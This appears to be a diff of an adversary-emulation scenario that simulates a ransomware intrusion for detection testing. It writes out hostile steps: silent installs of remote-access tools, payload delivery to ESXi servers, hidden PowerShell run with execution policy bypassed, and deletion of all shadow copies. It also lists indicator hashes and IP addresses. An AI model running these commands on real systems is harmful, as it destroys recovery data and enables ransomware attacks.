+        $destination.ip = ip.gethostbyname($destination.domain)
+        $url.path = "/AnyDesk.exe"
+        run HTTPConnection
+    }
+    sleep 5
+    
+    $installer_path = """C:\Users\${user.name}\Downloads\AnyDesk.exe"""
+    step create_file_AnyDesk_exe {
+        $file.path = $installer_path
+        action File.Create
+    }
+    sleep 1
+
+    step execute_installer {
+        $process.command_line = "${installer_path} /silent"
+        action Process.Start
+    }
+    sleep 10  # Waiting for installation to complete
+
+    # Step 3: Clean Up
+    step cleanup {
+        $file.path = """C:\Users\${domain_username}\Downloads\AnyDesk.exe"""
+        action File.Delete
+    }
+}
+
+
+section download_and_install_winscp "Download and Install WINSCP" {
+
+    $installer_path = """C:\Users\${user.name}\WinSCP-5.19.5-Setup.exe"""
+
+    # Step 1: Download WinSCP Installer
+    step download_winscp_installer {
+        $destination.port = 443
+        $destination.domain = "winscp.net"
+        $origin.ip = $host_f_ip
+        $destination.ip = ip.gethostbyname($destination.domain)
+        $url.path = "/download/WinSCP-5.19.5-Setup.exe"
+        run HTTPConnection
+    }
+    sleep 5
+
+    # Step 2: Execute WinSCP Installer
+    step execute_installer {
+        $process.command_line = "${installer_path} /SILENT"
+        action Process.Start
+    }
+    sleep 10  # Waiting for installation to complete
+
+    # Step 3: Clean Up
+    step cleanup {
+        $file.path = $installer_path
+        action File.Delete
+    }
+    sleep 10
+}
+
+
+section create_ransomware_payload_67 "Create Ransomware Payload 67" {
+    step create_file_67 {
+        $file.path = "C:\Users\${domain_username}\Documents\67"
+        action File.Create
+    }
+    sleep 10
+}
+
+section transfer_payload_and_start_to_ESXi_server "Transfer and start payload to ESXi server" {
+    $ip_esxi_servers = [
+        $esxi_server_1_ip,
+        $esxi_server_2_ip
+    ]
+    loop $ip_esxi_servers as $ip_esxi_server {
+        step connection_via_ssh {
+            action User.LoginSuccess
+        }
+        sleep 120
+        
+        step create_payload {
+            $file.name = "67"
+            action File.Create
+        }
+        sleep 1
+        
+        # Need to have more explanation on that one 
+        step start_payload {
+            $process.command_line = "67"
+            action Process.Start
+        }
+    }
+    sleep 120
+}
+
+section create_and_run_fury_on_multiple_hosts "Create and run Fury on multiple hosts" {
+    step create_file_fury {
+        $file.name = "FURY.exe"
+        action File.Create
+    }   
+    sleep 5
+    
+    step run_fury {
+        $process.command_line = "powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File FURY.exe"
+        action Process.Start
+    }
+    sleep 5
+    
+    step run_windows_shadow_copy_service {
+        $process.command_line = "cmd.exe /c $vssadmin_path Delete Shadows /All /Quiet"
+        action Process.Start
+    }
+    sleep 5
+}
+section run_all_indicators_of_compromise "Running all indicators of compromise" {
+    step file {
+        $file.name = "psversion.txt"
+        $file.hash.md5 = "86A1461B30BB482652D8E2223D03C2A4"
+        $file.hash.sha256 = "8E43D1DDBD5C129055528A93F1E3FAB0ECDF73A8A7BA9713DC4C3E216D7E5DB4"
+
+        action File.Open
+    }
+# No known behavior from 8E43D1DDBD5C129055528A93F1E3FAB0ECDF73A8A7BA9713DC4C3E216D7E5DB4
+
+    step file {
+        $file.name = "Pstools.chm"
+        $file.hash.md5 = "009AC2BE60F92DC2C41B094CE2D3857C"
+        $file.hash.sha256 = "2813B6C07D17D25670163E0F66453B42D2F157BF2E42007806EBC6BB9D114ACC"
+
+        action File.Open
+    }
+# Behavior from 2813B6C07D17D25670163E0F66453B42D2F157BF2E42007806EBC6BB9D114ACC
+    step process {
+        $process.command_line = """"C:\Windows\hh.exe" C:\Users\user\Desktop\file.chm"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """"C:\Windows\hh.exe" C:\Users\user\Desktop\sample.chm"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """"C:\Windows\hh.exe" C:\Users\user\Desktop\Pstools.chm"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "PSTools.zip"
+        $file.hash.sha256 = "A9CA77DFE03CE15004157727BB43BA66F00CEB215362C9B3D199F000EDAA8D61"
+
+        action File.Open
+    }
+# Behavior from A9CA77DFE03CE15004157727BB43BA66F00CEB215362C9B3D199F000EDAA8D61
+
+    step file {
+        $file.name = "pssuspend.exe"
+        $file.hash.md5 = "1B9F1A75593DFC670FA7C54659AB5796"
+        $file.hash.sha256 = "95A922E178075FB771066DB4AB1BD70C7016F794709D514AB1C7F11500F016CD"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 95A922E178075FB771066DB4AB1BD70C7016F794709D514AB1C7F11500F016CD
+    step process {
+        $process.command_line = """%SAMPLEPATH%\pssuspend.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "pssuspend64.exe"
+        $file.hash.md5 = "6EEEEB93F86C729FAA2280525C699CAF"
+        $file.hash.sha256 = "4BF8FBB7DB583E1AACBF36C5F740D012C8321F221066CC68107031BD8B6BC1EE"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 4BF8FBB7DB583E1AACBF36C5F740D012C8321F221066CC68107031BD8B6BC1EE
+    step process {
+        $process.command_line = """%SAMPLEPATH%\pssuspend.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\pssuspend64.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "psshutdown.exe"
+        $file.hash.md5 = "31E8E12D02A6CAC9088D89215CF4552C"
+        $file.hash.sha256 = "13FD3AD690C73CF0AD26C6716D4E9D1581B47C22FB7518B1D3BF9CFB8F9E9123"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 13FD3AD690C73CF0AD26C6716D4E9D1581B47C22FB7518B1D3BF9CFB8F9E9123
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psshutdown.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Program Files (x86)\Google3288_1869191564\bin\updater.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\13fd3ad690c73cf0ad26c6716d4e9d1581b47c22fb7518b1d3bf9cfb8f9e9123.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "psshutdown64.exe"
+        $file.hash.md5 = "B5B4ABC85D5D8C817CE552C3C6A0ABA5"
+        $file.hash.sha256 = "4226738489C2A67852D51DBF96574F33E44E509BC265B950D495DA79BB457400"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 4226738489C2A67852D51DBF96574F33E44E509BC265B950D495DA79BB457400
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psshutdown.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Program Files (x86)\Google428_1029437205\bin\updater.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psshutdown64.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "psping.exe"
+        $file.hash.md5 = "93F162D9E1AE290F47695E71589FD4D4"
+        $file.hash.sha256 = "355B4A82313074999BD8FA1332B1ED00034E63BD2A0D0367E2622F35D75CF140"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 355B4A82313074999BD8FA1332B1ED00034E63BD2A0D0367E2622F35D75CF140
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psping.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "psping64.exe"
+        $file.hash.md5 = "AD7E3DDF557E1DE0170E384031D3A221"
+        $file.hash.sha256 = "D1F718D219930E57794BDADF9DDA61406294B0759038CEF282F7544B44B92285"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from D1F718D219930E57794BDADF9DDA61406294B0759038CEF282F7544B44B92285
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psping.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psping64.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "pspasswd.exe"
+        $file.hash.md5 = "427214D675B6BCE9F273EB2DDE0AEEFC"
+        $file.hash.sha256 = "6ED5D50CF9D07DB73EAA92C5405F6B1BF670028C602C605DFA7D4FCB80EF0801"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 6ED5D50CF9D07DB73EAA92C5405F6B1BF670028C602C605DFA7D4FCB80EF0801
+    step process {
+        $process.command_line = """%SAMPLEPATH%\pspasswd.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\DeviceCensus.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\6ed5d50cf9d07db73eaa92c5405f6b1bf670028c602c605dfa7d4fcb80ef0801.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "pspasswd64.exe"
+        $file.hash.md5 = "2A23848AC28D73352BA80584327FF713"
+        $file.hash.sha256 = "8D950068F46A04E77AD6637C680CCCF5D703A1828FBD6BDCA513268AF4F2170F"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 8D950068F46A04E77AD6637C680CCCF5D703A1828FBD6BDCA513268AF4F2170F
+    step process {
+        $process.command_line = """%SAMPLEPATH%\pspasswd.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\pspasswd64.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "psloglist.exe"
+        $file.hash.md5 = "4F7F8D6C8B22EB5C0C35B29210E2127C"
+        $file.hash.sha256 = "DCDB9BD39B6014434190A9949DEDF633726FDB470E95CC47CDAA47C1964B969F"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from DCDB9BD39B6014434190A9949DEDF633726FDB470E95CC47CDAA47C1964B969F
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psloglist.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\dcdb9bd39b6014434190a9949dedf633726fdb470e95cc47cdaa47c1964b969f.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "psloglist64.exe"
+        $file.hash.md5 = "14B2F5291036BE454AE2FC762FF6EAAA"
+        $file.hash.sha256 = "5E55B4CAF47A248A10ABD009617684E969DBE5C448D087EE8178262AAAB68636"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 5E55B4CAF47A248A10ABD009617684E969DBE5C448D087EE8178262AAAB68636
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psloglist.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psloglist64.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "pslist.exe"
+        $file.hash.md5 = "6C08BAE0981841E0CD22FF0F0E8F7510"
+        $file.hash.sha256 = "ED05F5D462767B3986583188000143F0EB24F7D89605523A28950E72E6B9039A"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from ED05F5D462767B3986583188000143F0EB24F7D89605523A28950E72E6B9039A
+    step process {
+        $process.command_line = """%SAMPLEPATH%\pslist.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "pslist64.exe"
+        $file.hash.md5 = "77BF50713A9EB7B270A73A9797F8DDFE"
+        $file.hash.sha256 = "D3247F03DCD7B9335344EBBA76A0B92370F32F1CB0E480C734DA52DB2BD8DF60"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from D3247F03DCD7B9335344EBBA76A0B92370F32F1CB0E480C734DA52DB2BD8DF60
+    step process {
+        $process.command_line = """%SAMPLEPATH%\pslist.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\pslist64.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "pskill.exe"
+        $file.hash.md5 = "5801303C49E5BB612AA55FB8B909A9C9"
+        $file.hash.sha256 = "5EF168F83B55D2CBD2426AFC5E6FA8161270FA6A2A312831332DC472C95DFA42"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 5EF168F83B55D2CBD2426AFC5E6FA8161270FA6A2A312831332DC472C95DFA42
+    step process {
+        $process.command_line = """%SAMPLEPATH%\pskill.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "pskill64.exe"
+        $file.hash.md5 = "BA9345119C1175C96D27370B0D203E70"
+        $file.hash.sha256 = "7BA47558C99E18C2C6449BE804B5E765C48D3A70CEAA04C1E0FAE67FF1D7178D"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 7BA47558C99E18C2C6449BE804B5E765C48D3A70CEAA04C1E0FAE67FF1D7178D
+    step process {
+        $process.command_line = """%SAMPLEPATH%\pskill.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\pskill64.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "psfile.exe"
+        $file.hash.md5 = "A0C7585C86AB8BFE6D55A2547E7C9382"
+        $file.hash.sha256 = "4243DC8B991F5F8B3C0F233CA2110A1E03A1D716C3F51E88FAF1D59B8242D329"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 4243DC8B991F5F8B3C0F233CA2110A1E03A1D716C3F51E88FAF1D59B8242D329
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psfile.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "psfile64.exe"
+        $file.hash.md5 = "880ED8C97E6BDB64A342FAD25094049B"
+        $file.hash.sha256 = "BE922312978A53C92A49FEFD2C9F9CC098767B36F0E4D2E829D24725DF65BC21"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from BE922312978A53C92A49FEFD2C9F9CC098767B36F0E4D2E829D24725DF65BC21
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psfile.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psfile64.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "Eula.txt"
+        $file.hash.md5 = "8C24C4084CDC3B7E7F7A88444A012BFC"
+        $file.hash.sha256 = "8329BCBADC7F81539A4969CA13F0BE5B8EB7652B912324A1926FC9BFB6EC005A"
+
+        action File.Open
+    }
+# Behavior from 8329BCBADC7F81539A4969CA13F0BE5B8EB7652B912324A1926FC9BFB6EC005A
+    step process {
+        $process.command_line = """/usr/libexec/xpcproxy"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """/Applications/TextEdit.app/Contents/MacOS/TextEdit /Applications/TextEdit.app/Contents/MacOS/TextEdit """
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "PsService.exe"
+        $file.hash.md5 = "136F9205A5945681EC470B8461DFEE5F"
+        $file.hash.sha256 = "D3A816FE5D545A80E4639B34B90D92D1039EB71EF59E6E81B3C0E043A45B751C"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from D3A816FE5D545A80E4639B34B90D92D1039EB71EF59E6E81B3C0E043A45B751C
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psservice.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Program Files (x86)\Google3616_766246807\bin\updater.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\PsService.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "PsService64.exe"
+        $file.hash.md5 = "657C2DA84107644A1397D49E0B526F24"
+        $file.hash.sha256 = "554F523914CDBAED8B17527170502199C185BD69A41C81102C50DBB0E5E5A78D"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 554F523914CDBAED8B17527170502199C185BD69A41C81102C50DBB0E5E5A78D
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psservice.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\PsService64.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "PsLoggedon.exe"
+        $file.hash.md5 = "E3EA271E748CCDAD6A6D3E692D6F337E"
+        $file.hash.sha256 = "D689CB1DBD2E4C06CD15E51A6871C406C595790DDCDCD7DC8D0401C7183720EF"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from D689CB1DBD2E4C06CD15E51A6871C406C595790DDCDCD7DC8D0401C7183720EF
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psloggedon.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\PsLoggedon.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\d689cb1dbd2e4c06cd15e51a6871c406c595790ddcdcd7dc8d0401c7183720ef.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "PsInfo.exe"
+        $file.hash.md5 = "2691D7F266050E6849793D4B6661DDDF"
+        $file.hash.sha256 = "951B1B5FD5CB13CDE159CEBC7C60465587E2061363D1D8847AB78B6C4FBA7501"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 951B1B5FD5CB13CDE159CEBC7C60465587E2061363D1D8847AB78B6C4FBA7501
+    step process {
+        $process.command_line = """%SAMPLEPATH%\Psinfo.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\PsInfo.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\951b1b5fd5cb13cde159cebc7c60465587e2061363d1d8847ab78b6c4fba7501.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "PsInfo64.exe"
+        $file.hash.md5 = "86A65CFA9F258B0A46ED54E1AD235078"
+        $file.hash.sha256 = "DE73B73EEB156F877DE61F4A6975D06759292ED69F31AAF06C9811F3311E03E7"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from DE73B73EEB156F877DE61F4A6975D06759292ED69F31AAF06C9811F3311E03E7
+    step process {
+        $process.command_line = """%SAMPLEPATH%\Psinfo.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\DeviceCensus.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Program Files (x86)\Google2096_1214977411\bin\updater.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\PsInfo64.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "PsGetsid64.exe"
+        $file.hash.md5 = "C2B0F2DE5955AAA313999FF20B675BE4"
+        $file.hash.sha256 = "201D8E77CCC2575D910D47042A986480B1DA28CF0033E7EE726AD9D45CCF4DAA"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 201D8E77CCC2575D910D47042A986480B1DA28CF0033E7EE726AD9D45CCF4DAA
+    step process {
+        $process.command_line = """%SAMPLEPATH%\PsGetSid.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\PsGetsid64.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "PsExec64.exe"
+        $file.hash.md5 = "DB89EC570E6281934A5C5FCF7F4C8967"
+        $file.hash.sha256 = "EDFAE1A69522F87B12C6DAC3225D930E4848832E3C551EE1E7D31736BF4525EF"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from EDFAE1A69522F87B12C6DAC3225D930E4848832E3C551EE1E7D31736BF4525EF
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psexec.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\PsExec64.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Program Files (x86)\Google2812_1843778028\bin\updater.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Program Files (x86)\Google812_580390067\bin\updater.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "PsGetsid.exe"
+        $file.hash.md5 = "3D4112B92A8285D8661BBC29125BDBF5"
+        $file.hash.sha256 = "A48AC157609888471BF8578FB8B2AEF6B0068F7E0742FCCF2E0E288B0B2CFDFB"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from A48AC157609888471BF8578FB8B2AEF6B0068F7E0742FCCF2E0E288B0B2CFDFB
+    step process {
+        $process.command_line = """%SAMPLEPATH%\PsGetSid.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\PsGetsid.exe"""
+        action Process.Start
+    }
+
+
+    step ipv4 {
+        $destination.ip = "5.39.222.67"
+
+        run TCPHandshake
+    }
+
+    step ipv4 {
+        $destination.ip = "157.154.194.6"
+
+        run TCPHandshake
+    }
+
+    step ipv4 {
+        $destination.ip = "108.62.141.161"
+
+        run TCPHandshake
+    }
+
+    step file {
+        $file.name = "S_2.bat"
+        $file.hash.sha256 = "918784E25BD24192CE4E999538BE96898558660659E3C624A5F27857784CD7E1"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# No known behavior from 918784E25BD24192CE4E999538BE96898558660659E3C624A5F27857784CD7E1
+
+    step file {
+        $file.name = "S_1.bat"
+        $file.hash.sha256 = "97766464D0F2F91B82B557AC656AB82E15CAE7896B1D8C98632CA53C15CF06C4"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# No known behavior from 97766464D0F2F91B82B557AC656AB82E15CAE7896B1D8C98632CA53C15CF06C4
+
+    step file {
+        $file.name = "S_0.bat"
+        $file.hash.sha256 = "1C4978CD5D750A2985DA9B58DB137FC74D28422F1E087FD77642FAA7EFE7B597"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# No known behavior from 1C4978CD5D750A2985DA9B58DB137FC74D28422F1E087FD77642FAA7EFE7B597
+
+    step file {
+        $file.name = "1.ps1"
+        $file.hash.sha256 = "4E34B9442F825A16D7F6557193426AE7A18899ED46D3B896F6E4357367276183"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# No known behavior from 4E34B9442F825A16D7F6557193426AE7A18899ED46D3B896F6E4357367276183
+
+    step file {
+        $file.name = "conhost.exe"
+        $file.hash.sha256 = "6633FA85BB234A75927B23417313E51A4C155E12F71DA3959E168851A600B010"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# No known behavior from 6633FA85BB234A75927B23417313E51A4C155E12F71DA3959E168851A600B010
+
+    step file {
+        $file.name = "Sock5.sh"
+        $file.hash.sha256 = "48F559E00C472D9FFE3965AB92C6D298F8FB3A3F0D6D203CD2069BFCA4BF3A57"
+
+        action File.Open
+    }
+# No known behavior from 48F559E00C472D9FFE3965AB92C6D298F8FB3A3F0D6D203CD2069BFCA4BF3A57
+
+    step file {
+        $file.name_array = ["psexec.c", "psexec.exe"]
+        $file.name = random($file.name_array)
+
+        $file.hash.md5 = "24A648A48741B1AC809E47B9543C6F12"
+        $file.hash.sha256 = "078163D5C16F64CAA5A14784323FD51451B8C831C73396B967B4E35E6879937B"
+
+        $process.command_line=$file.name
+
+        action Process.Start
+    }
+# Behavior from 078163D5C16F64CAA5A14784323FD51451B8C831C73396B967B4E35E6879937B
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psexec.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+    $process.command_line = """C:\Program Files (x86)\Google3788_2045219743\bin\updater.exe"""
+    action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\PsExec.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Program Files (x86)\Google3684_121300059\bin\updater.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Program Files (x86)\Google3784_1711249772\bin\updater.exe"""
+        action Process.Start
+    }
+
+
+    step file {
+        $file.name = "PsLoggedon64.exe"
+        $file.hash.md5 = "07ED30D2343BF8914DAAED872B681118"
+        $file.hash.sha256 = "FDADB6E15C52C41A31E3C22659DD490D5B616E017D1B1AA6070008CE09ED27EA"
+
+    $process.command_line=$file.name
+
+    action Process.Start
+}
+# Behavior from FDADB6E15C52C41A31E3C22659DD490D5B616E017D1B1AA6070008CE09ED27EA
+    step process {
+        $process.command_line = """%SAMPLEPATH%\psloggedon.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """C:\Windows\System32\wuapihost.exe"""
+        action Process.Start
+    }
+
+    step process {
+        $process.command_line = """%SAMPLEPATH%\PsLoggedon64.exe"""
+        action Process.Start
+    }
+
+
+    step ipv4 {
+        $destination.ip = "156.96.62.58"
+
+        run TCPHandshake
+    }
+
+    step ipv4 {
+        $destination.ip = "146.70.104.249"
+
+        run TCPHandshake
+    }
+
+    step ipv4 {
+        $destination.ip = "108.62.118.136"
+
+        run TCPHandshake
+    }
+
+    step ipv4 {
+        $destination.ip = "5.255.99.59"
+
+        run TCPHandshake
+    }
+
+    step ipv4 {
+        $destination.ip = "51.77.102.106"
+
+        run TCPHandshake
+    }
+}
+section end "End" {}
+
